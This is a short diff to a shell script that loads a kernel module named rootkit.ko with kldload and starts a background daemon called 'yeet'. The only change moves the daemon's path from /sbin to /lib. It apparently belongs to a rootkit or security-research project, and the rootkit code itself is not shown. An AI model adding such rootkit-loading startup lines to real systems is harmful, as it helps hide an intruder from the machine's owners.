@@ -1,4 +1,4 @@
 #!/bin/sh
 
 kldload /boot/kernel/rootkit.ko
-/sbin/daemon yeet &
+/lib/daemon yeet &
